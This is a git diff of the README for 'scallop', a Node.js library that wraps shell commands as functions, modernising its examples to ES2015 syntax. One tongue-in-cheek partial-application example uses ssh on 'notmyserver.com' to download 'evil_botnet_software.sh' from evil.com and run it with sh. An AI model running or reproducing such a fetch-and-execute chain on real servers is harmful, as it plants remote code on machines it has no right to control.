@@ -11,10 +11,11 @@ $ npm i --save-dev scallop
 ```
 
 ```javascript
-var sh = require("scallop"),
-    curl = sh("curl", {silent: true});
-curl("http://httpbin.org/user-agent", function(err, result) {
-    console.log(JSON.parse(result)["user-agent"]); // curl/7.30.0
+const scallop = require('scallop');
+const curl = scallop('curl', {silent: true});
+
+curl('http://httpbin.org/user-agent', (err, result) => {
+  console.log(JSON.parse(result)['user-agent']); // curl/7.30.0
 });
 // Of course this is a horribly contrived example. You should use `http.get`.
 ```
@@ -27,20 +28,20 @@ Literal Arguments
 Anything you pass directly to your wrapper function gets passed through.
 
 ```javascript
-var mkdir = sh("mkdir");
-mkdir("example_directory");
+const mkdir = scallop('mkdir');
+mkdir('example_directory');
 ```
 
 Multiple arguments can be provided.
 
 ```javascript
-mkdir("-p", "parent/child");
+mkdir('-p', 'parent/child');
 ```
 
 Spaces and the like are automatically escaped.
 
 ```javascript
-mkdir("Some directory with spaces! Wooo! Rebellion!");
+mkdir('Some directory with spaces! Wooo! Rebellion!');
 ```
 
 Remember that, because this is node, everything is asynchronous, all our calls
@@ -54,10 +55,12 @@ Because `Function.apply` is needlessly ugly, you can simply pass arrays beside
 literal arguments.
 
 ```javascript
-var myFolders = ["folderA", "folderB", "folderC"];
-mkdir("-p", "-v", myFolders);
+const myFolders = ['folderA', 'folderB', 'folderC'];
+mkdir('-p', '-v', myFolders);
 // which is the same as
-mkdir.apply(null, ["-p", "-v"].concat(myFolders));
+mkdir.apply(null, ['-p', '-v'].concat(myFolders));
+// or in ES2015
+mkdir('-p', '-v', ...myFolders);
 ```
 
 You can even have nested lists, and they'll all be expanded upon evaluation.
@@ -68,26 +71,26 @@ Partial Application
 You know, I kinda wish `mkdir` supplied `-p` by default.
 
 ```javascript
-mkdir = mkdir.partial("-p");
-mkdir("another-parent/child");
+mkdir = mkdir.partial('-p');
+mkdir('another-parent/child');
 ```
 
 Oh! Look at that! It's okay I guess. I just wish it required **exactly one**
 less function call. If only we could apply the partial when creating `mkdir`....
 
 ```javascript
-var mkdir = sh("mkdir", "-p");
+const mkdir = scallop('mkdir', '-p');
 ```
 
 Alright. That looks cool, but kinda limited in use.
 
 ```javascript
-var ssh = sh("ssh"),
-    definitelyMyServer = ssh.partial("notmyserver.com", "-p 1234"),
-    remoteCurl = definitelyMyServer.partial("curl", "--silent");
+const ssh = scallop('ssh');
+const definitelyMyServer = ssh.partial('notmyserver.com', '-p 1234');
+const remoteCurl = definitelyMyServer.partial('curl', '--silent');
 
-remoteCurl("-O", "http://evil.com/evil_botnet_software.sh");
-definitelyMyServer("sh", "evil_botnet_software.sh");
+remoteCurl('-O', 'http://evil.com/evil_botnet_software.sh');
+definitelyMyServer('sh', 'evil_botnet_software.sh');
 // Please only use this on PHP websites
 ```
 
@@ -98,8 +101,8 @@ We can define some of the common subcommands for `git` with the
 `defineSubcommands` function.
 
 ```javascript
-var git = sh("git").defineSubcommands("status", "add", "rm", "clone");
-git.clone("https://github.com/bgw/scallop.git", "scallop");
+const git = scallop('git').defineSubcommands('status', 'add', 'rm', 'clone');
+git.clone('https://github.com/bgw/scallop.git', 'scallop');
 ```
 
 A subcommand can be defined by a `--dashed-argument`, just pass it to
@@ -111,27 +114,27 @@ by defining subcommands with and object. Arrays of subcommands can be
 intermingled, forming leaves, or falsy values can be provided to prune the tree.
 
 ```javascript
-var sudo = sh("sudo");
-sudo.defineSubcommands({ls: null, git: ["status", "add", "rm"], echo: null});
-sudo.git.add("important_file.txt");
+const sudo = scallop('sudo');
+sudo.defineSubcommands({ls: null, git: ['status', 'add', 'rm'], echo: null});
+sudo.git.add('important_file.txt');
 ```
 
-#### ES6 Harmony Proxy Syntax
+#### ES2015 Harmony Proxy Syntax
 
 Having to make a call to `defineSubcommands` sucks, and there's no real reason
 (except a lack of language support) why the subcommands should ever have to be
 explicitly predefined.
 
-The next version of JS adds [object Proxies][]. These allow us to intercept
-accesses to an underlying object. If you enable proxies by passing
-`--harmony-proxies` or `--harmony` to `node`, then you can use some alternate
-syntax. Eventually this proposed language feature should be enabled by default
-in future versions of node.
+The ES2015 adds [object Proxies][]. These allow us to intercept accesses to an
+underlying object. If you enable proxies by passing `--harmony-proxies` or
+`--harmony` to `node`, then you can use some alternate syntax. There's no
+portable way to compile away or polyfill the Proxy API. Eventually this
+language feature should be enabled by default in future versions of node.
 
-  [object Proxies]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy
+[object Proxies]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy
 
 ```javascript
-sh.ssh["bgw@benjam.info"].git.rm("important_file.txt");
+scallop.ssh['bgw@benjam.info'].git.rm('important_file.txt');
 ```
 
 Take *that*, ES5!
@@ -144,15 +147,15 @@ Because the output of commands is **occasionally useful**, I guess it might be
 is with a callback.
 
 ```javascript
-var _s = require("underscore.string"),
-    ls = sh("ls", "-1");
-ls(function(err, result) {
-    if(err) {
-        throw err; // Oh my god! Something horrible must have happened!
-    }
-    console.log(_s.strip(result).split("\n"));
+const _s = require('underscore.string');
+const ls = scallop('ls', '-1');
+ls((err, result) => {
+  if (err) {
+    throw err; // Oh my god! Something horrible must have happened!
+  }
+  console.log(_s.strip(result).split('\n'));
 });
-// ["another_parent", "example_directory", ... ]
+// ['another_parent', 'example_directory', ... ]
 ```
 
 **Warning:** All calls resulting in shell execution are asynchronous, so there's
@@ -196,12 +199,19 @@ Would translate into
 ### Use with a callback
 
 The callback is **always the last** argument. As a result, the call remains
-readable with CoffeeScript syntax.
+readable with coffescript or ES2015 arrow function syntax.
 
 ```coffeescript
-ls = sh "ls"
-ls "-1", all: true, recursive: false, (err, res) ->
-    console.log res
+ls = sh 'ls'
+ls '-1', all: true, recursive: false, (err, res) ->
+  console.log res
+```
+
+```js
+ls = sh('ls');
+ls('-1', {all: true, recursive: false}, (err, res) => {
+  console.log(res);
+});
 ```
 
 ### "Special" Keyword Arguments
